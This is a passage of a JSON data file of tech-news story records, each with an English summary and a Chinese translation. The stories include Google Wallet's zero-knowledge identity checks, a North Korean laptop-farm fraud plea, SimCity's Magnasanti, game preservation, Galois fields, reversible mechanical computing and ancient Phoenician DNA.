    "chinese_summary": "谷歌钱包推出新功能，利用零知识证明（ZKP）技术安全验证年龄和身份，从而增强隐私性。英国居民很快就能将护照中的数字身份凭证存储到谷歌钱包中，首先用于铁路卡的验证。英国还在探索通过其数字身份信任框架扩大这些身份凭证的使用范围，用于购买酒精等商品。\n\n在美国，阿肯色州、蒙大拿州、波多黎各和西弗吉尼亚州很快将支持把政府颁发的数字身份证件保存到谷歌钱包中，而亚利桑那州、佐治亚州、马里兰州和新墨西哥州将允许在DMV（车辆管理局）使用移动身份证。美国的基于护照的身份凭证可在TSA（运输安全管理局）安检处用于国内旅行，即使没有REAL ID（真实身份认证）也可以。\n\n新的合作关系将使数字身份凭证能够用于亚马逊账户恢复，通过CVS Health和Epic的MyChart访问在线健康服务，以及验证优步等平台上的个人资料。零知识证明（ZKP）技术的集成能够实现快速且私密的年龄验证，而无需泄露个人信息，并且这项技术将开源给其他钱包和服务。\n\n谷歌钱包还在扩展到另外50个国家/地区，使用户即使在无法使用点击支付功能的地方也能查看和使用数字凭证。这项全球扩张扩大了谷歌钱包的安全性和便利性功能的覆盖范围。"
  },
  {
    "id": "43860207",
    "title": "Arizona laptop farmer pleads guilty for funneling $17M to Kim Jong Un",
    "url": "https://www.theregister.com/2025/02/12/arizona_woman_laptop_farm_guilty/",
    "summary": "An Arizona woman, Christina Marie Chapman, pleaded guilty to conspiracy charges for running a \"laptop farm\" that funneled over $17 million to North Korea. From 2020 to 2023, Chapman hosted computers in her home for overseas IT workers, posing as Americans, to give them US IP addresses. She also helped them steal identities of over 70 US citizens to secure remote IT jobs. Payroll checks were sent to Chapman's home, deposited into her accounts, laundered, and sent to North Korea, potentially funding its weapons programs.\n\nThe scheme targeted over 300 US companies, including Fortune 500 firms in sectors like television, technology, aerospace, automotive, and retail. The North Koreans specifically targeted certain companies for their sensitive data. More than 70 individuals had their identities stolen and false tax liabilities created. The fraudsters also submitted fake documents to the Department of Homeland Security.\n\nAuthorities say that North Korea has earned at least $88 million in similar scams over six years. Chapman faces a sentence of 94 to 111 months in prison. The case highlights the increasing sophistication of North Korean cybercrime, including the use of AI-based tools for deception, to generate revenue.\n",
    "chinese_title": "亚利桑那州“笔记本农民”认罪，向金正恩输送1700万美元",
    "chinese_summary": "亚利桑那州女子因运营“笔记本电脑农场”向朝鲜输送超1700万美元认罪。2020年至2023年，克里斯蒂娜·玛丽·查普曼在其家中架设电脑，供海外IT人员冒充美国人使用，为他们提供美国IP地址。她还帮助他们盗用70多名美国公民的身份以获得远程IT工作。工资支票寄往查普曼家中，存入她的账户，经过洗钱后被送往朝鲜，可能资助了其武器计划。\n\n该计划针对超过300家美国公司，包括电视、科技、航空航天、汽车和零售等行业的财富500强企业。朝鲜人专门针对某些公司以获取其敏感数据。超过70人的身份被盗用并产生虚假的税务债务。诈骗分子还向国土安全部提交了虚假文件。\n\n当局表示，朝鲜在六年内通过类似诈骗至少赚取了8800万美元。查普曼将面临94至111个月的监禁。该案件凸显了朝鲜网络犯罪日益复杂，包括使用基于人工智能的工具进行欺骗以产生收入。"
  },
  {
    "id": "43868130",
    "title": "The Totalitarian Buddhist Who Beat SIM City (2010)",
    "url": "https://web.archive.org/web/20211117094441/https://www.vice.com/en/article/4w4kg3/the-totalitarian-buddhist-who-beat-sim-city",
    "summary": "This article from 2010 interviews Vincent Ocasla, a 22-year-old architecture student from the Philippines, about his creation in SimCity 3000: Magnasanti. Magnasanti is a highly organized, densely populated city of six million Sims, a dystopian vision he describes as a \"totalitarian Sim City hellscape.\"\n\nOcasla's creation was inspired by Godfrey Reggio's film \"Koyaanisqatsi,\" and reflects his views on modern society, which he sees as regimented and brutally controlled. He designed the city based on the Bhavacakra, the Buddhist Wheel of Life, but twisted it to represent the enslavement of its citizens for eternity.\n\nThe Sims in Magnasanti live in a highly controlled environment with stagnant population growth, limited mobility, and poor living conditions. While the city appears orderly, it suffers from severe air pollution, high unemployment, and a lack of essential services like fire stations, schools, and hospitals. Despite these hardships, the Sims don't rebel, highlighting Ocasla's commentary on a populace \"dumbed down\" and mind-controlled by an efficient police state.\n\nOcasla emphasizes that his approach to SimCity is artistic self-expression, not just a game. He used the platform to magnify the ambitions of dictatorial leaders and critique societal ills. Though a former Buddhist, he now considers himself a \"freethinker\" fascinated by sacred geometry and cyclical notions of time. He also clarifies that he does not suffer from any mental illness or disorder.\n",
    "chinese_title": "击败模拟城市的极权佛教徒 (2010)",
    "chinese_summary": "2010年的一篇文章采访了来自菲律宾的22岁建筑系学生文森特·奥卡斯拉，关于他在模拟城市3000中创作的作品：马格纳桑提。马格纳桑提是一个高度组织化、人口密集的城市，拥有六百万模拟市民，是他描述为“极权主义模拟城市地狱景象”的反乌托邦景象。\n\n奥卡斯拉的创作灵感来源于戈弗雷·雷吉奥的电影《失衡生活》，并反映了他对现代社会的看法，他认为现代社会受到严格控制且残酷。他根据佛教的生命之轮——轮回图设计了这座城市，但扭曲了它，以代表其公民永世为奴。\n\n马格纳桑提的模拟市民生活在一个高度受控的环境中，人口增长停滞，流动性有限，生活条件恶劣。虽然这座城市看起来井然有序，但它遭受着严重的空气污染、高失业率以及缺乏消防站、学校和医院等基本服务。尽管面临这些困境，模拟市民并没有反抗，突显了奥卡斯拉对一个被高效警察国家“愚弄”和精神控制的民众的评论。\n\n奥卡斯拉强调，他对模拟城市的方式是一种艺术自我表达，而不仅仅是一款游戏。他利用这个平台来放大独裁领导人的野心并批判社会弊病。虽然他曾经是一名佛教徒，但现在他认为自己是一个对神圣几何和时间循环概念着迷的“自由思想者”。他还澄清说，他没有患任何精神疾病或障碍。"
  },
  {
    "id": "43867923",
    "title": "We May Be About to Lose a Powerful Force in Video Game Preservation",
    "url": "https://www.timeextension.com/features/we-might-be-about-to-lose-a-powerful-force-in-the-world-of-video-game-preservation",
    "summary": "The Japanese Game Preservation Society (GPS), a non-profit dedicated to preserving Japanese gaming history, is on the verge of shutting down due to financial difficulties. Founded in 2011, the GPS has successfully preserved thousands of games and related media, including fragile floppy disks, with support from industry legends. However, the organization currently has insufficient funds to cover its monthly rent and is losing money each month.\n\nGPS founder Joseph Redon has been subsidizing the organization with his own money for years, and volunteer members face challenges like limited resources and a lack of English-speaking staff for outreach. While Western counterparts like The Video Game History Foundation have thrived, the GPS struggles due to stricter Japanese laws, hindering its ability to share preserved ROMs and attract funding. These restrictions also limit their ability to utilize the Internet Archive to make certain assets publicly accessible.\n\nThe GPS faces criticism for not publicly sharing ROMs, while attempts to raise funds through auctions and commissioned articles have yielded minimal results. Government funding has limitations, and efforts to create engaging video documentaries have not attracted significant viewership. The organization needs approximately 400 new supporters donating small monthly amounts to stay afloat and continue its vital preservation work. Redon remains committed to the organization's independence and refuses to compromise its integrity for financial gain.\n",
    "chinese_title": "我们可能即将失去视频游戏保护的一股强大力量",
    "chinese_summary": "日本游戏保存协会（GPS）是一个致力于保存日本游戏历史的非营利组织，由于财政困难，正面临倒闭的境地。GPS成立于2011年，在行业传奇人物的支持下，成功保存了数千款游戏及相关媒体，包括易损的软盘。然而，该组织目前资金不足，无法支付每月租金，并且每月都在亏损。\n\nGPS创始人约瑟夫·雷东多年来一直用自己的钱补贴该组织，志愿者成员也面临着资源有限以及缺乏会说英语的员工进行对外联络等挑战。虽然像视频游戏历史基金会这样的西方同行蓬勃发展，但由于日本法律更加严格，限制了其分享保存的ROM和吸引资金的能力，GPS举步维艰。这些限制也限制了他们利用互联网档案馆公开某些资产的能力。\n\nGPS因未公开分享ROM而受到批评，而通过拍卖和委托文章筹集资金的尝试收效甚微。政府资金有限制，制作引人入胜的视频纪录片的努力也未能吸引大量观众。该组织需要大约400名新的支持者每月捐赠少量资金，才能维持生存并继续其重要的保存工作。雷东仍然致力于该组织的独立性，并拒绝为了经济利益而损害其完整性。"
  },
  {
    "id": "43867171",
    "title": "Learn You Galois Fields for Great Good",
    "url": "https://xorvoid.com/galois_fields_for_great_good_00.html",
    "summary": "This article introduces a series on Galois Fields (Finite Fields) and their applications in Computer Science, aiming to provide accessible learning resources for computer scientists lacking a strong background in Abstract Algebra. The author, frustrated by existing resources that were either overly simplified or overly complex, seeks to bridge the gap with a step-by-step approach using practical code examples.\n\nThe series emphasizes the importance of abstract algebra as a foundation for understanding algorithms used in data manipulation, encoding, encryption, and error detection. It argues that by understanding the relationships between numbers (rather than the numbers themselves), computer scientists can leverage mathematical principles for various tasks, such as operating on 8-bit bytes.\n\nThe author highlights the wide range of applications, including CRC, AES Encryption, Reed-Solomon coding, and more. The approach will be cumulative, relying on active learning, literate programming, and Rust code examples. The focus is on understandability and education rather than optimized production code.\n\nA rough plan for the series is outlined, covering group theory, field theory, GF(p) and GF(p^k) implementations, polynomial arithmetic, CRC, linear algebra over fields, Reed-Solomon, and AES encryption. The author emphasizes the importance of the initial theoretical sections for later success and encourages readers to implement and experiment alongside the material.\n",
    "chinese_title": "为了伟大的利益，学习伽罗瓦域",
    "chinese_summary": "本文介绍一个关于伽罗瓦域（有限域）及其在计算机科学中应用的一系列文章，旨在为缺乏抽象代数背景的计算机科学家提供易于理解的学习资源。作者对现有资源要么过于简化要么过于复杂感到沮丧，试图通过使用实际代码示例的循序渐进的方法来弥合这一差距。\n\n该系列强调了抽象代数作为理解数据操作、编码、加密和错误检测中使用算法的基础的重要性。它认为，通过理解数字之间的关系（而不是数字本身），计算机科学家可以利用数学原理来执行各种任务，例如操作 8 位字节。\n\n作者强调了广泛的应用范围，包括 CRC、AES 加密、Reed-Solomon 编码等等。该方法将是累积性的，依赖于主动学习、文学编程和 Rust 代码示例。重点是可理解性和教育，而不是优化的生产代码。\n\n概述了该系列文章的大致计划，涵盖群论、域论、GF(p) 和 GF(p^k) 的实现、多项式算术、CRC、域上的线性代数、Reed-Solomon 和 AES 加密。作者强调了初始理论部分对于后续成功的重要性，并鼓励读者一边阅读材料一边进行实现和实验。"
  },
  {
    "id": "43856798",
    "title": "The Brief Origins of May Day",
    "url": "https://archive.iww.org/history/library/misc/origins_of_mayday/",
    "summary": "Unable to access the article link.\n",
    "chinese_title": "五一节的简要起源",
    "chinese_summary": "无法访问文章链接。"
  },
  {
    "id": "43848398",
    "title": "Reversible computing with mechanical links and pivots",
    "url": "https://tennysontbardwell.com/blog/2025/04/30/mechanical-computing/index.html",
    "summary": "This article explores the concept of reversible computing as a potential solution to the limitations of traditional computing paradigms, particularly as Moore's Law slows down. Reversible computing aims for maximum energy efficiency by minimizing entropy generation during computation. The article highlights that current computing technology is still significantly less efficient than the theoretical limit imposed by Landauer's principle.\n\nThe author then introduces a specific reversible computing scheme described in the paper \"Mechanical Computing Systems Using Only Links and Rotary Joints,\" focusing on building Turing-complete machines using mechanical links and hinges. Key components of this scheme are:\n\n*   **The Lock:** A mechanism with two triangles that mutually exclude each other's movement, enabling binary logic.\n*   **The Balance:** A device incorporating two locks and a lever, ensuring that either the \"1\" or \"0\" line of a bit is always engaged.\n*   **Bellcrank:** Used to route and split signals\n\nThese components are then combined to create a NAND gate, a universal gate capable of implementing any truth table. The article includes interactive demos illustrating the function of each component and the NAND gate itself. The author concludes by pointing to a related talk by one of the paper's authors for further information.\n",
    "chinese_title": "使用机械连杆和枢轴的可逆计算",
    "chinese_summary": "本文探讨了可逆计算的概念，作为传统计算范式局限性的潜在解决方案，尤其是在摩尔定律放缓的情况下。可逆计算旨在通过最大限度地减少计算过程中的熵产生来达到最大的能源效率。文章强调，当前的计算技术仍然远低于兰道尔原理所设定的理论极限。\n\n作者随后介绍了论文《仅使用连杆和旋转关节的机械计算系统》中描述的一种特定的可逆计算方案，重点是使用机械连杆和铰链构建图灵完备的机器。该方案的关键组成部分是：\n\n*   **锁（The Lock）：** 一种包含两个相互排斥运动的三角形的机制，实现二元逻辑。\n*   **平衡器（The Balance）：** 一种包含两个锁和一个杠杆的装置，确保一个比特的“1”线或“0”线始终处于激活状态。\n*   **曲柄（Bellcrank）：** 用于路由和分割信号。\n\n然后将这些组件组合起来以创建一个与非门（NAND gate），一种能够实现任何真值表的通用门。文章包含交互式演示，说明了每个组件和与非门本身的功能。作者最后指出了该论文作者之一的相关演讲，以获取更多信息。"
  },
  {
    "id": "43848325",
    "title": "NotebookLM Audio Overviews are now available in over 50 languages",
    "url": "https://blog.google/technology/google-labs/notebooklm-audio-overviews-50-languages/",
    "summary": "NotebookLM now offers Audio Overviews in over 50 languages, expanding access to its popular podcast-like summary feature. Powered by Gemini's native audio support, users can now listen to AI-generated summaries of their notes in their preferred language, ranging from Afrikaans to Turkish.\n\nThis multilingual update introduces a new \"Output Language\" setting, allowing users to choose the desired language for Audio Overviews and chat responses. This capability aims to break down language barriers and make information more accessible for learners and educators.\n\nFor example, a teacher can share resources in various languages and students can generate Audio Overviews in their native tongue, facilitating comprehension and study. NotebookLM encourages users to explore this feature and provide feedback as they continue to refine and expand it. This is part of a continued expansion to make NotebookLM available globally.\n",
    "chinese_title": "NotebookLM 音频概览现已支持超过 50 种语言",
    "chinese_summary": "NotebookLM现已提供超过50种语言的音频概述，扩展了其流行的播客式摘要功能。凭借Gemini的原生音频支持，用户现在可以收听人工智能生成的笔记摘要，并选择从南非语到土耳其语的偏好语言。\n\n这次多语言更新引入了新的“输出语言”设置，允许用户选择音频概述和聊天回复的所需语言。此功能旨在打破语言障碍，使学习者和教育工作者更容易获取信息。\n\n例如，教师可以分享各种语言的资源，学生可以用自己的母语生成音频概述，从而促进理解和学习。NotebookLM鼓励用户探索此功能并提供反馈，以便他们继续改进和扩展它。这是持续扩展的一部分，旨在使NotebookLM在全球范围内可用。"
  },
  {
    "id": "43852145",
    "title": "Apple violated antitrust ruling, judge finds",
    "url": "https://www.wsj.com/tech/apple-violated-antitrust-ruling-federal-judge-finds-66b85957",
    "summary": "Unable to access the article link.\n",
    "chinese_title": "苹果违反反垄断裁决，法官裁定",
    "chinese_summary": "无法访问文章链接。"
  },
  {
    "id": "43868928",
    "title": "Executive order directs federal funding cuts to PBS and NPR",
    "url": "https://apnews.com/article/trump-npr-pbs-republicans-public-broadcasting-f0e3e1acb96986732a0211833165bf84",
    "summary": "Unable to access the article link.\n",
    "chinese_title": "行政命令指示削减联邦对PBS和NPR的拨款",
    "chinese_summary": "无法访问文章链接。"
  },
  {
    "id": "43862893",
    "title": "Ancient DNA Unveils the Cosmopolitan Heart of the Phoenician-Punic Civilization",
    "url": "https://allthathistory.com/archaeology-discoveries/phoenician-punic-civilization/2622/",
    "summary": "This article discusses a recent ancient DNA study that challenges traditional views of the Phoenician-Punic civilization. Contrary to the belief that Phoenician influence spread primarily through mass migration from the Levant, the study reveals a civilization built on diverse ancestries from across the Mediterranean, including Sicilian, Aegean, and North African populations.\n\nResearchers analyzed DNA from 73 individuals across 14 archaeological sites in the Mediterranean, finding surprisingly little genetic contribution from the Levant. Instead, the Punic communities were a \"kaleidoscope of ancestries\", reflecting a vibrant mix of cultures brought together through trade, intermarriage, and shared rituals. The study found evidence of close family ties between individuals buried in geographically distant locations, such as North Africa and Sicily, demonstrating the extensive interconnectedness of the Punic world.\n\nThe findings suggest that trade, rather than solely migration, was the primary driver of cultural exchange and genetic diversity within the Punic civilization. The alphabet, for example, spread not through Levantine settlers, but through adoption and adaptation by diverse communities. The article emphasizes the importance of recognizing North African contributions to the Punic civilization, challenging Eurocentric perspectives. Ultimately, the Punic civilization serves as a reminder that diversity and connection can foster progress, offering a valuable lesson for today's globalized world.\n",
    "chinese_title": "古代DNA揭示腓尼基-布匿文明的世界性中心",
    "chinese_summary": "本文探讨了一项最新的古DNA研究，该研究挑战了对腓尼基-布匿文明的传统观点。与认为腓尼基的影响主要通过从黎凡特的大规模移民传播的观点相反，该研究揭示了一个建立在来自地中海各地（包括西西里、爱琴海和北非人口）不同血统之上的文明。\n\n研究人员分析了地中海地区14个考古遗址中73名个体的DNA，发现来自黎凡特的遗传贡献出人意料地少。相反，布匿社群是“万花筒般的血统”，反映了通过贸易、通婚和共同仪式聚集在一起的充满活力的文化融合。该研究发现了埋葬在地理位置遥远的地方（如北非和西西里）的个体之间存在密切家庭关系的证据，表明了布匿世界广泛的相互联系。\n\n研究结果表明，贸易而非仅仅是移民，是布匿文明内部文化交流和遗传多样性的主要驱动力。例如，字母的传播不是通过黎凡特定居者，而是通过不同社群的采用和适应。本文强调了认识北非对布匿文明的贡献的重要性，挑战了以欧洲为中心的视角。最终，布匿文明提醒我们，多样性和联系可以促进进步，为当今全球化的世界提供宝贵的经验教训。"
  }
]